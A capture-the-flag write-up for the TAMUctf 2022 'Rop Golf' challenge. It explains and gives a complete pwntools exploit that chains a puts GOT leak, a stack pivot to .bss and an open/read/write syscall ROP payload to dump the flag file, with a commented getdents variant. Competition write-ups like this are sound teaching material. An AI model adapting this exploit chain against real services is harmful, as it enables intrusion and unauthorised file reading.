### Rop Golf

was an pwn challenge from TAMUctf 2022.

I got first blood on it (while playing for friends of Flag Poisonning)

A type of restricted ROP, where you have only 4 ROP entries to do you rop,

so we will have to do a succession of payloads..

Here is the vulnerable function:

![](https://github.com/nobodyisnobody/write-ups/raw/main/TamuCTF.2022/pwn/Rop.Golf/pics/reverse.png)

you can see the buffer overflow, we will have 0x20 bytes, so 4 ROP entries avaible for our ROP

so we will use successive payloads:

*  1st payload:   we dump `puts()` **GOT** entry, with `puts()`, then go back to vuln function for second round

* 2nd payload:   we read the third payload on the `.bss `with `gets()` function, then stack pivot to it

* 3rd payload:   we will use two payloads one is a `open directory / getdents (list dirs) /  write output to stdout `  payload
                          this first type of payload list directories, and discover the flag 'quasi random' name                       
													the second type is a `open file / read it / write it to stdout` to dump our flag..

and that's all...

as you can see...

![](https://github.com/nobodyisnobody/write-ups/raw/main/TamuCTF.2022/pwn/Rop.Golf/pics/gotshell.gif)

and here is my exploit commented...

hope you will undestand it :)

```python3
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")

exe = ELF('./rop_golf_patched')
libc = ELF('./libc.so.6')

host, port = "206.189.113.236", "30674"

p = remote("tamuctf.com", 443, ssl=True, sni="rop-golf")

pop_rdi = 0x00000000004011fb # pop rdi ; ret
pop_rbp = 0x0000000000401129 # pop rbp ; ret
leave_ret = 0x0000000000401161 # leave ; ret

# 1st payload, first we leak puts got entry to calculate libc base, then return to vuln
payload = b'A'*0x28+p64(pop_rdi)+p64(exe.got['puts'])+p64(exe.sym['puts'])+p64(0x401142)
p.sendafter('hi!\n', payload)

# calculate libc base
leak = u64(p.recvuntil(b'\n',drop=True).ljust(8,b'\x00'))
print('leak = '+hex(leak))
libc.address = leak - libc.sym['puts']
print('libc base = '+hex(libc.address))

# 2nd payload, read the first payload on .bss and pivot to it
bss = 0x404c00
onegadgets = one_gadget('libc.so.6', libc.address)
payload = b'A'*0x20+p64(bss+64-8)+p64(pop_rdi)+p64(bss)+p64(libc.sym['gets'])+p64(leave_ret)
p.send(payload)

# various gadgets
pop_rdx = libc.address + 0x0000000000044198 # pop rdx ; ret
pop_rsi = libc.address + 0x000000000002440e # pop rsi ; ret
pop_rax = libc.address + 0x000000000003a638 # pop rax ; ret
xchg_edi_eax = libc.address + 0x0000000000116dbc # xchg eax, edi ; ret
syscall_ret = libc.address + 0x00000000000b58a5 # syscall; ret;
fname = b'/pwn/066A2462DEB399BA9183A91FC116914C.txt'
fname = fname.ljust(64,b'\x00')

# 3rd oayload with fname gonna dump
# open fname
payload4 = fname + p64(pop_rdi)+p64(bss)+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(2)+p64(syscall_ret)
# read file
payload4 += p64(xchg_edi_eax)+p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(0x80)+p64(pop_rax)+p64(0)+p64(syscall_ret)
# write file content to stdout
payload4 += p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(0x80)+p64(pop_rax)+p64(1)+p64(syscall_ret)
#exit
payload4 += p64(pop_rax)+p64(60)+p64(syscall_ret)
p.sendline(payload4)

# alternative payload that does getdents, and return directory content 
#payload4 = fname + p64(pop_rdi)+p64(bss)+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(2)+p64(syscall_ret)
#payload4 += p64(xchg_edi_eax)+p64(pop_rsi)+p64(bss-0x100)+p64(pop_rdx)+p64(0x200)+p64(pop_rax)+p64(78)+p64(syscall_ret)
#payload4 += p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(bss-0x100)+p64(pop_rdx)+p64(0x200)+p64(pop_rax)+p64(1)+p64(syscall_ret)
#payload4 += p64(pop_rax)+p64(60)+p64(syscall_ret)
#p.sendline(payload4)

#buff = p.recv()
#print(dirents(buff))

p.interactive()
```

*nobodyisnobody still pwning things...*

